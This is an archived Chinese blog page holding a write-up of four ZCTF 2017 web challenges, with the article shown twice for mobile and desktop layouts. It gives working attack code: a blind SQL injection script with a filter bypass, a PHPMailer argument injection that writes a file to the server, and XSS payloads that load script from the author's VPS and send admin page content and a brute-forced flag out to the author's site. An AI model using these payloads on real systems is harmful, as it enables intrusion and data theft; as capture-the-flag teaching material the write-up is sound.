@@ -1,0 +1,604 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./ZCTF2017-WEB-Writeup/font-awesome.min.css" rel="stylesheet"/>
+<link href="./ZCTF2017-WEB-Writeup/screen.css" rel="stylesheet"/>
+<link href="./ZCTF2017-WEB-Writeup/prism_okaidia.css" rel="stylesheet"/>
+<link href="./ZCTF2017-WEB-Writeup/bendawang.css" rel="stylesheet"/>
+<script src="./ZCTF2017-WEB-Writeup/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./ZCTF2017-WEB-Writeup/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./ZCTF2017-WEB-Writeup/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h2 id="web1">web-1</h2>
+<p style="max-width:100%;height:auto;">进去扫一下目录发现有备份文件如下，</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$flag = $_GET[&amp;apos;flag&amp;apos;];
+if ($flag != &amp;apos;15562&amp;apos;) {
+    if (strstr(&amp;apos;zctf123&amp;apos;, &amp;apos;zctf&amp;apos;)) {
+        if (substr(md5($flag),8,16) == substr(md5(&amp;apos;15562&amp;apos;),8,16)) {
+            die(&amp;apos;ZCTF{#########}&amp;apos;);
+        }
+    }
+}
+die(&amp;apos;ha?&amp;apos;)
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">简单阅读时候发现一个双等比较，那么看看等号后面的值是个0e开头的值，也就是一个弱类型比较了，爆破就好了，代码如下：
+注意这里0e后面的值一定要是0-9，应该能够秒出答案的。</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import hashlib
+b=&amp;apos;-=[],./;"1234567890abcdefghijklmnoprstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;apos;
+
+def find(str1):
+    if hashlib.md5(str1).hexdigest()[8:10]==&amp;apos;0e&amp;apos;:
+        flag=0
+        for i in hashlib.md5(str1).hexdigest()[10:24]:
+            if i&gt;&amp;apos;9&amp;apos;:
+                flag=1;
+                break
+        if flag==0:
+            print str1
+            input("success")
+    if(len(str1)&gt;8):
+        return
+    else:
+        for i in b:
+            find(str1+i)
+if __name__ == &amp;apos;__main__&amp;apos;:
+    find(a)
+</code></pre>
+<h2 id="web2">web-2</h2>
+<p style="max-width:100%;height:auto;">这里进去看到一个网站，简单扫了扫目录也没发现什么问题，后来在contact.php那里的表单提交处发现了一个可以提交东西的地方并且有比较明确的返回，然后大概猜测是个xss,多次尝试之后发现很多东西都被过滤了，观察同源策略，目测只能是使用script标签，但是过滤规则相当严格，折腾很久之后想到了用sourceMappingURL,这个东西恰好前段时间写博客调试js的时候用到过了，主要是用于方便调试的，有兴趣的可以自己去谷歌学习下。另外就是题目刚开始过滤了冒号无法使用<code style="max-width:100%;height:auto;">http://</code>，后来好像有修改了，放开了过滤，不过通过<code style="max-width:100%;height:auto;">//www.XXXXXX.xip,io</code>它会默认为http协议，这样就能绕开过滤了，下面是截图
+<br/><img alt="" data-action="zoom" src="./ZCTF2017-WEB-Writeup/58b110536dddb53c5b000000.png" style="max-width:100%;height:auto;"/><br/>
+<br/><img alt="" data-action="zoom" src="./ZCTF2017-WEB-Writeup/58b111dc6dddb53c5b000002.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web3">web-3</h2>
+<p style="max-width:100%;height:auto;">首先是apk一开始是一个登陆框，经过逆向，发现登陆网址，以及apk向网址发送的加密算法，有了加密算法，我们就可以伪造成apk向网址发送请求了，接下来就是注入了，同样是被疯狂过滤，但是发现服务器过滤了<code style="max-width:100%;height:auto;">union select</code>,但是二者分开单独都没有被过滤，所以寻找代替空格的特殊字符，发现就只有<code style="max-width:100%;height:auto;">union%a0select</code>没有被过滤，写代码的时候注意替换成<code style="max-width:100%;height:auto;">union\xa0select</code>，之后通过order by判断有3个字段，然后发现过滤无法查询系统表，也无法获取表名，猜测表名是password和username，这两个单词也都被过滤了，无法获取表名，想到通过join引入新查询组合替换表名，但是这个时候发现小括号被过滤了，此路不通，换个思路，<code style="max-width:100%;height:auto;">wargame.kr</code>的zairo有个思路是通过联合查询然后根据第几列排序，由于只显示查询结果的第一行的值，就可以根据这个回显来判断这第几列上值的大小关系然后爆破结果。
+即例如我输入如下：</p>
+<pre><code class="sql language-sql" style="max-width:100%;height:auto;">admin&amp;apos; union\xa0select 1,2,&amp;apos;a&amp;apos; order by 3 asc#
+</code></pre>
+<p style="max-width:100%;height:auto;">第三列是密码所在的列，如果回显是2，说明密码第一位大于<code style="max-width:100%;height:auto;">a</code>，否则说明第一位小于或等于<code style="max-width:100%;height:auto;">a</code>,如此逐位爆破密码即可。脚本如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
+r=requests.session()
+def encrypto(data):
+    data=data[::-1]
+    key = &amp;apos;1470&amp;apos;
+    result = []
+    for i in range(len(data)):
+        tmp = ord(key[i%len(key)]) ^ ord(data[i])
+        result.append(tmp)
+    return &amp;apos;&amp;apos;.join([&amp;apos;%.2x&amp;apos; % i for i in result])
+
+
+def getpassword():  
+    ans=""
+    for i in xrange(32):
+        for j in xrange(30,127):
+            username = "admin&amp;apos; union\xa0select 1,2,&amp;apos;"+ans+chr(j)+"&amp;apos; order by 3 asc#"
+            #print username
+            password = "1"
+            param={
+                "username":encrypto(username),
+                "password":encrypto(password)
+                }
+            result=r.post("http://58.213.63.30:10005/",data=param)
+            #print result.content
+            if "admin" in result.content:
+                break
+        ans+=chr(j-1)
+        print ans
+
+getpassword()   #得到密码hash是 5af1ab27b1be8bb8e39bdf98cd2cfce4 解出来 CleverBoy123
+</code></pre>
+<p style="max-width:100%;height:auto;">拿到密码之后登陆进去发现有个可以让你向服务器提交一堆关于email的参数，联想到之前的phpmailer的漏洞，也懒得多想先随便写个php试试，后来看到官方hint说根目录不可写，那么扫一下目录发现存在一个uploads目录，往里面写吧，一写东西立马就返回了flag。最后代码如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;"># encoding:utf-8
+import requests
+r=requests.session()
+def encrypto(data):
+    data=data[::-1]
+    key = &amp;apos;1470&amp;apos;
+    result = []
+    for i in range(len(data)):
+        tmp = ord(key[i%len(key)]) ^ ord(data[i])
+        result.append(tmp)
+    return &amp;apos;&amp;apos;.join([&amp;apos;%.2x&amp;apos; % i for i in result])
+
+
+def getpassword():  
+    ans=""
+    for i in xrange(32):
+        for j in xrange(30,127):
+            username = "admin&amp;apos; union\xa0select 1,2,&amp;apos;"+ans+chr(j)+"&amp;apos; order by 3 asc#"
+            #print username
+            password = "1"
+            param={
+                "username":encrypto(username),
+                "password":encrypto(password)
+                }
+            result=r.post("http://58.213.63.30:10005/",data=param)
+            #print result.content
+            if "admin" in result.content:
+                break
+        ans+=chr(j-1)
+        print ans
+
+#getpassword()   #得到密码hash是 5af1ab27b1be8bb8e39bdf98cd2cfce4 解出来 CleverBoy123
+
+def next():
+    r=requests.session()
+    param1={
+        "username":encrypto("admin"),
+        "password":encrypto("CleverBoy123")
+        }
+    result1=r.post("http://58.213.63.30:10005/",data=param1)
+    param={
+        "username":encrypto("admin"),
+        "password":encrypto("ClerverBoy123"),
+        "mail":encrypto("aaa( -X/var/www/html/upload/bendawang.php )@qq.com"),
+        "title":encrypto("bendawang"),
+        "body":encrypto("bendawang")
+
+    }
+    header={"Cookie":result1.headers[&amp;apos;set-cookie&amp;apos;]}
+    result=r.post("http://58.213.63.30:10005/mail.php",data=param,headers=header)
+    print result.content
+    result=r.get("http://58.213.63.30:10005/upload/bendawang.php")
+    print result.content
+next()#zctf{c20cd895e09260b709fd3537361da181} 
+</code></pre>
+<h2 id="web4">web-4</h2>
+<p style="max-width:100%;height:auto;">这道题登陆进去发现在profile.php下面nick输入框里面存在xss注入，会在index.php里面回显触发，过滤一些东西但是都能双写绕过不影响，加上bugscan那里可以提交一个链接给管理员访问，接下来就是想办法xss管理员的cookie或是其他东西，构造一个html如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;html&gt;
+&lt;head&gt;
+    &lt;script src="jquery-3.1.1.js"&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;form action="http://58.213.63.30:10003/checkProfile.php" method="POST" id="profile" enctype="multipart/form-data"&gt;
+        &lt;input class="form-control" name="nick" id="nick" /&gt;
+        &lt;input class="form-control" name="age" id="age" /&gt;
+        &lt;input class="form-control" name="address" id="address" /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+$("form input:eq(0)").val("\&lt;scriscriptpt src=http:\/\/104.160.43.154\/a.js\&gt;");
+$("form input:eq(1)").val("123");
+$("form input:eq(2)").val(&amp;apos;\&lt;\/scrscriptipt\&gt;&amp;apos;);
+$("form").submit();
+window.location.href="http://58.213.63.30:10003/index.php";
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后在vps上放置的a.js如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">$.get("http://58.213.63.30:10003/index.php",function(data,status){
+    $.get("http://bendawang.site/?a="+escape(data));
+})
+</code></pre>
+<p style="max-width:100%;height:auto;">这样通过修改js，就能访问管理的各项信息，发现管理没有cookie返回，note也没有数据，之后x到的后台进去看到了大家的payload,发现有人在search下面做文章，想到note没东西可以去search那里搜索，在写个脚本爆破搜索试试，这是在后台上看到的大家payload，当时直接拿过来用了。</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;html&gt;
+&lt;head&gt;
+    &lt;script src="jquery-3.1.1.js"&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;
+tab="0123456789abcdefghijklmnopqrstuvwxyz}"
+str=&amp;apos;&amp;apos;
+$.ajaxSettings.async=false
+while(true){
+  for(i=0;i&lt;tab.length;i++){
+    //console.log(tab[i]);
+    flag=false
+    x=$.get(&amp;apos;http://58.213.63.30:10003/search.php?keywords=zctf{&amp;apos;+str+tab[i]);
+    if(x.status==404) flag=true;
+    if(!flag) break;
+  }
+  str+=tab[i];
+  console.log(str);
+  if(tab[i]==&amp;apos;}&amp;apos;) break;
+}
+$.get("http://bendawang.site/?a="+escape(str))
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">不过最后bot也没有临幸我，没能拿到flag。</p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./ZCTF2017-WEB-Writeup/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h2 id="web1">web-1</h2>
+<p style="max-width:100%;height:auto;">进去扫一下目录发现有备份文件如下，</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$flag = $_GET[&amp;apos;flag&amp;apos;];
+if ($flag != &amp;apos;15562&amp;apos;) {
+    if (strstr(&amp;apos;zctf123&amp;apos;, &amp;apos;zctf&amp;apos;)) {
+        if (substr(md5($flag),8,16) == substr(md5(&amp;apos;15562&amp;apos;),8,16)) {
+            die(&amp;apos;ZCTF{#########}&amp;apos;);
+        }
+    }
+}
+die(&amp;apos;ha?&amp;apos;)
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">简单阅读时候发现一个双等比较，那么看看等号后面的值是个0e开头的值，也就是一个弱类型比较了，爆破就好了，代码如下：
+注意这里0e后面的值一定要是0-9，应该能够秒出答案的。</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import hashlib
+b=&amp;apos;-=[],./;"1234567890abcdefghijklmnoprstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;apos;
+
+def find(str1):
+    if hashlib.md5(str1).hexdigest()[8:10]==&amp;apos;0e&amp;apos;:
+        flag=0
+        for i in hashlib.md5(str1).hexdigest()[10:24]:
+            if i&gt;&amp;apos;9&amp;apos;:
+                flag=1;
+                break
+        if flag==0:
+            print str1
+            input("success")
+    if(len(str1)&gt;8):
+        return
+    else:
+        for i in b:
+            find(str1+i)
+if __name__ == &amp;apos;__main__&amp;apos;:
+    find(a)
+</code></pre>
+<h2 id="web2">web-2</h2>
+<p style="max-width:100%;height:auto;">这里进去看到一个网站，简单扫了扫目录也没发现什么问题，后来在contact.php那里的表单提交处发现了一个可以提交东西的地方并且有比较明确的返回，然后大概猜测是个xss,多次尝试之后发现很多东西都被过滤了，观察同源策略，目测只能是使用script标签，但是过滤规则相当严格，折腾很久之后想到了用sourceMappingURL,这个东西恰好前段时间写博客调试js的时候用到过了，主要是用于方便调试的，有兴趣的可以自己去谷歌学习下。另外就是题目刚开始过滤了冒号无法使用<code style="max-width:100%;height:auto;">http://</code>，后来好像有修改了，放开了过滤，不过通过<code style="max-width:100%;height:auto;">//www.XXXXXX.xip,io</code>它会默认为http协议，这样就能绕开过滤了，下面是截图
+<br/><img alt="" data-action="zoom" src="./ZCTF2017-WEB-Writeup/58b110536dddb53c5b000000.png" style="max-width:100%;height:auto;"/><br/>
+<br/><img alt="" data-action="zoom" src="./uploads/./ZCTF2017-WEB-Writeup_files/58b111dc6dddb53c5b000002.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web3">web-3</h2>
+<p style="max-width:100%;height:auto;">首先是apk一开始是一个登陆框，经过逆向，发现登陆网址，以及apk向网址发送的加密算法，有了加密算法，我们就可以伪造成apk向网址发送请求了，接下来就是注入了，同样是被疯狂过滤，但是发现服务器过滤了<code style="max-width:100%;height:auto;">union select</code>,但是二者分开单独都没有被过滤，所以寻找代替空格的特殊字符，发现就只有<code style="max-width:100%;height:auto;">union%a0select</code>没有被过滤，写代码的时候注意替换成<code style="max-width:100%;height:auto;">union\xa0select</code>，之后通过order by判断有3个字段，然后发现过滤无法查询系统表，也无法获取表名，猜测表名是password和username，这两个单词也都被过滤了，无法获取表名，想到通过join引入新查询组合替换表名，但是这个时候发现小括号被过滤了，此路不通，换个思路，<code style="max-width:100%;height:auto;">wargame.kr</code>的zairo有个思路是通过联合查询然后根据第几列排序，由于只显示查询结果的第一行的值，就可以根据这个回显来判断这第几列上值的大小关系然后爆破结果。
+即例如我输入如下：</p>
+<pre><code class="sql language-sql" style="max-width:100%;height:auto;">admin&amp;apos; union\xa0select 1,2,&amp;apos;a&amp;apos; order by 3 asc#
+</code></pre>
+<p style="max-width:100%;height:auto;">第三列是密码所在的列，如果回显是2，说明密码第一位大于<code style="max-width:100%;height:auto;">a</code>，否则说明第一位小于或等于<code style="max-width:100%;height:auto;">a</code>,如此逐位爆破密码即可。脚本如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
+r=requests.session()
+def encrypto(data):
+    data=data[::-1]
+    key = &amp;apos;1470&amp;apos;
+    result = []
+    for i in range(len(data)):
+        tmp = ord(key[i%len(key)]) ^ ord(data[i])
+        result.append(tmp)
+    return &amp;apos;&amp;apos;.join([&amp;apos;%.2x&amp;apos; % i for i in result])
+
+
+def getpassword():  
+    ans=""
+    for i in xrange(32):
+        for j in xrange(30,127):
+            username = "admin&amp;apos; union\xa0select 1,2,&amp;apos;"+ans+chr(j)+"&amp;apos; order by 3 asc#"
+            #print username
+            password = "1"
+            param={
+                "username":encrypto(username),
+                "password":encrypto(password)
+                }
+            result=r.post("http://58.213.63.30:10005/",data=param)
+            #print result.content
+            if "admin" in result.content:
+                break
+        ans+=chr(j-1)
+        print ans
+
+getpassword()   #得到密码hash是 5af1ab27b1be8bb8e39bdf98cd2cfce4 解出来 CleverBoy123
+</code></pre>
+<p style="max-width:100%;height:auto;">拿到密码之后登陆进去发现有个可以让你向服务器提交一堆关于email的参数，联想到之前的phpmailer的漏洞，也懒得多想先随便写个php试试，后来看到官方hint说根目录不可写，那么扫一下目录发现存在一个uploads目录，往里面写吧，一写东西立马就返回了flag。最后代码如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;"># encoding:utf-8
+import requests
+r=requests.session()
+def encrypto(data):
+    data=data[::-1]
+    key = &amp;apos;1470&amp;apos;
+    result = []
+    for i in range(len(data)):
+        tmp = ord(key[i%len(key)]) ^ ord(data[i])
+        result.append(tmp)
+    return &amp;apos;&amp;apos;.join([&amp;apos;%.2x&amp;apos; % i for i in result])
+
+
+def getpassword():  
+    ans=""
+    for i in xrange(32):
+        for j in xrange(30,127):
+            username = "admin&amp;apos; union\xa0select 1,2,&amp;apos;"+ans+chr(j)+"&amp;apos; order by 3 asc#"
+            #print username
+            password = "1"
+            param={
+                "username":encrypto(username),
+                "password":encrypto(password)
+                }
+            result=r.post("http://58.213.63.30:10005/",data=param)
+            #print result.content
+            if "admin" in result.content:
+                break
+        ans+=chr(j-1)
+        print ans
+
+#getpassword()   #得到密码hash是 5af1ab27b1be8bb8e39bdf98cd2cfce4 解出来 CleverBoy123
+
+def next():
+    r=requests.session()
+    param1={
+        "username":encrypto("admin"),
+        "password":encrypto("CleverBoy123")
+        }
+    result1=r.post("http://58.213.63.30:10005/",data=param1)
+    param={
+        "username":encrypto("admin"),
+        "password":encrypto("ClerverBoy123"),
+        "mail":encrypto("aaa( -X/var/www/html/upload/bendawang.php )@qq.com"),
+        "title":encrypto("bendawang"),
+        "body":encrypto("bendawang")
+
+    }
+    header={"Cookie":result1.headers[&amp;apos;set-cookie&amp;apos;]}
+    result=r.post("http://58.213.63.30:10005/mail.php",data=param,headers=header)
+    print result.content
+    result=r.get("http://58.213.63.30:10005/upload/bendawang.php")
+    print result.content
+next()#zctf{c20cd895e09260b709fd3537361da181} 
+</code></pre>
+<h2 id="web4">web-4</h2>
+<p style="max-width:100%;height:auto;">这道题登陆进去发现在profile.php下面nick输入框里面存在xss注入，会在index.php里面回显触发，过滤一些东西但是都能双写绕过不影响，加上bugscan那里可以提交一个链接给管理员访问，接下来就是想办法xss管理员的cookie或是其他东西，构造一个html如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;html&gt;
+&lt;head&gt;
+    &lt;script src="jquery-3.1.1.js"&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;form action="http://58.213.63.30:10003/checkProfile.php" method="POST" id="profile" enctype="multipart/form-data"&gt;
+        &lt;input class="form-control" name="nick" id="nick" /&gt;
+        &lt;input class="form-control" name="age" id="age" /&gt;
+        &lt;input class="form-control" name="address" id="address" /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+$("form input:eq(0)").val("\&lt;scriscriptpt src=http:\/\/104.160.43.154\/a.js\&gt;");
+$("form input:eq(1)").val("123");
+$("form input:eq(2)").val(&amp;apos;\&lt;\/scrscriptipt\&gt;&amp;apos;);
+$("form").submit();
+window.location.href="http://58.213.63.30:10003/index.php";
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后在vps上放置的a.js如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">$.get("http://58.213.63.30:10003/index.php",function(data,status){
+    $.get("http://bendawang.site/?a="+escape(data));
+})
+</code></pre>
+<p style="max-width:100%;height:auto;">这样通过修改js，就能访问管理的各项信息，发现管理没有cookie返回，note也没有数据，之后x到的后台进去看到了大家的payload,发现有人在search下面做文章，想到note没东西可以去search那里搜索，在写个脚本爆破搜索试试，这是在后台上看到的大家payload，当时直接拿过来用了。</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;html&gt;
+&lt;head&gt;
+    &lt;script src="jquery-3.1.1.js"&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;
+tab="0123456789abcdefghijklmnopqrstuvwxyz}"
+str=&amp;apos;&amp;apos;
+$.ajaxSettings.async=false
+while(true){
+  for(i=0;i&lt;tab.length;i++){
+    //console.log(tab[i]);
+    flag=false
+    x=$.get(&amp;apos;http://58.213.63.30:10003/search.php?keywords=zctf{&amp;apos;+str+tab[i]);
+    if(x.status==404) flag=true;
+    if(!flag) break;
+  }
+  str+=tab[i];
+  console.log(str);
+  if(tab[i]==&amp;apos;}&amp;apos;) break;
+}
+$.get("http://bendawang.site/?a="+escape(str))
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">不过最后bot也没有临幸我，没能拿到flag。</p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./ZCTF2017-WEB-Writeup/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./ZCTF2017-WEB-Writeup/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./ZCTF2017-WEB-Writeup/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./ZCTF2017-WEB-Writeup/prism.js"></script>
+<script src="./ZCTF2017-WEB-Writeup/zooming.js"></script>
+<script src="./ZCTF2017-WEB-Writeup/Bendawang.js"></script>
+
+
